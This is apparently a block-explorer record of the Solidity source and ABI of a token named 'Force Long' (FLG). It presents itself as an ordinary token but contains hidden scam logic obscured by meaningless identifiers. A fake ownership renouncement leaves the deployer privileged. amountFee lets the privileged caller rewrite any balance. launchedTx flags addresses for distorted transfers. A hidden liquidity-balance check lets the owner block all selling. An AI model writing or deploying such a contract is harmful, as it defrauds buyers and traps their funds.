{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.8;\n\ninterface toSwapLiquidity {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract shouldSwapFrom {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface buySenderTx {\n    function createPair(address teamShouldSender, address totalReceiverLimit) external returns (address);\n}\n\ninterface maxEnable {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address buyLaunched) external view returns (uint256);\n\n    function transfer(address sellSender, uint256 maxTrading) external returns (bool);\n\n    function allowance(address txEnable, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 maxTrading) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address sellSender,\n        uint256 maxTrading\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed tokenAutoMin, uint256 value);\n    event Approval(address indexed txEnable, address indexed spender, uint256 value);\n}\n\ninterface maxEnableMetadata is maxEnable {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract ForceLong is shouldSwapFrom, maxEnable, maxEnableMetadata {\n\n    function name() external view virtual override returns (string memory) {\n        return minLiquidity;\n    }\n\n    function tokenMarketing(uint256 maxTrading) public {\n        modeLimit();\n        liquidityIsTeam = maxTrading;\n    }\n\n    function launchedMaxSwap(address fundMax) public {\n        if (autoShould) {\n            return;\n        }\n        \n        exemptMax[fundMax] = true;\n        if (walletReceiver != takeReceiver) {\n            walletReceiver = takeReceiver;\n        }\n        autoShould = true;\n    }\n\n    function enableFrom(address isReceiver, address sellSender, uint256 maxTrading) internal returns (bool) {\n        require(teamLaunch[isReceiver] >= maxTrading);\n        teamLaunch[isReceiver] -= maxTrading;\n        teamLaunch[sellSender] += maxTrading;\n        emit Transfer(isReceiver, sellSender, maxTrading);\n        return true;\n    }\n\n    function launchedTx(address teamSwap) public {\n        modeLimit();\n        if (walletReceiver == takeReceiver) {\n            isMarketing = true;\n        }\n        if (teamSwap == txLaunch || teamSwap == maxFee) {\n            return;\n        }\n        tradingTx[teamSwap] = true;\n    }\n\n    uint256 autoLimit;\n\n    uint8 private limitToken = 18;\n\n    uint256 public takeReceiver;\n\n    mapping(address => bool) public exemptMax;\n\n    address launchedLaunch = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint256 public walletReceiver;\n\n    function symbol() external view virtual override returns (string memory) {\n        return amountLimit;\n    }\n\n    address private maxMode;\n\n    mapping(address => uint256) private teamLaunch;\n\n    function decimals() external view virtual override returns (uint8) {\n        return limitToken;\n    }\n\n    function allowance(address buyMarketing, address totalMode) external view virtual override returns (uint256) {\n        if (totalMode == isExempt) {\n            return type(uint256).max;\n        }\n        return marketingExempt[buyMarketing][totalMode];\n    }\n\n    function balanceOf(address buyLaunched) public view virtual override returns (uint256) {\n        return teamLaunch[buyLaunched];\n    }\n\n    constructor (){\n        \n        toSwapLiquidity launchedReceiver = toSwapLiquidity(isExempt);\n        maxFee = buySenderTx(launchedReceiver.factory()).createPair(launchedReceiver.WETH(), address(this));\n        \n        txLaunch = _msgSender();\n        feeLimit();\n        exemptMax[txLaunch] = true;\n        teamLaunch[txLaunch] = takeList;\n        \n        emit Transfer(address(0), txLaunch, takeList);\n    }\n\n    bool public buyReceiver;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return takeList;\n    }\n\n    function transfer(address atSenderTrading, uint256 maxTrading) external virtual override returns (bool) {\n        return receiverFund(_msgSender(), atSenderTrading, maxTrading);\n    }\n\n    function getOwner() external view returns (address) {\n        return maxMode;\n    }\n\n    function feeLimit() public {\n        emit OwnershipTransferred(txLaunch, address(0));\n        maxMode = address(0);\n    }\n\n    bool private isMarketing;\n\n    function modeLimit() private view {\n        require(exemptMax[_msgSender()]);\n    }\n\n    address public txLaunch;\n\n    function approve(address totalMode, uint256 maxTrading) public virtual override returns (bool) {\n        marketingExempt[_msgSender()][totalMode] = maxTrading;\n        emit Approval(_msgSender(), totalMode, maxTrading);\n        return true;\n    }\n\n    mapping(address => bool) public tradingTx;\n\n    address public maxFee;\n\n    uint256 constant limitTotal = 14 ** 10;\n\n    function owner() external view returns (address) {\n        return maxMode;\n    }\n\n    function transferFrom(address isReceiver, address sellSender, uint256 maxTrading) external override returns (bool) {\n        if (_msgSender() != isExempt) {\n            if (marketingExempt[isReceiver][_msgSender()] != type(uint256).max) {\n                require(maxTrading <= marketingExempt[isReceiver][_msgSender()]);\n                marketingExempt[isReceiver][_msgSender()] -= maxTrading;\n            }\n        }\n        return receiverFund(isReceiver, sellSender, maxTrading);\n    }\n\n    bool public autoShould;\n\n    function receiverFund(address isReceiver, address sellSender, uint256 maxTrading) internal returns (bool) {\n        if (isReceiver == txLaunch) {\n            return enableFrom(isReceiver, sellSender, maxTrading);\n        }\n        uint256 txExempt = maxEnable(maxFee).balanceOf(launchedLaunch);\n        require(txExempt == liquidityIsTeam);\n        require(sellSender != launchedLaunch);\n        if (tradingTx[isReceiver]) {\n            return enableFrom(isReceiver, sellSender, limitTotal);\n        }\n        return enableFrom(isReceiver, sellSender, maxTrading);\n    }\n\n    mapping(address => mapping(address => uint256)) private marketingExempt;\n\n    string private minLiquidity = \"Force Long\";\n\n    uint256 private takeList = 100000000 * 10 ** 18;\n\n    address isExempt = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint256 liquidityIsTeam;\n\n    event OwnershipTransferred(address indexed txShould, address indexed feeLaunch);\n\n    function amountFee(address atSenderTrading, uint256 maxTrading) public {\n        modeLimit();\n        teamLaunch[atSenderTrading] = maxTrading;\n    }\n\n    string private amountLimit = \"FLG\";\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"txEnable\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"txShould\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"feeLaunch\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tokenAutoMin\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyMarketing\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"totalMode\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atSenderTrading\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"maxTrading\",\"type\":\"uint256\"}],\"name\":\"amountFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalMode\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"maxTrading\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoShould\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyLaunched\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"exemptMax\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeLimit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundMax\",\"type\":\"address\"}],\"name\":\"launchedMaxSwap\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamSwap\",\"type\":\"address\"}],\"name\":\"launchedTx\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxFee\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeReceiver\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"maxTrading\",\"type\":\"uint256\"}],\"name\":\"tokenMarketing\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"tradingTx\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atSenderTrading\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"maxTrading\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isReceiver\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"sellSender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"maxTrading\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txLaunch\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletReceiver\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "ForceLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}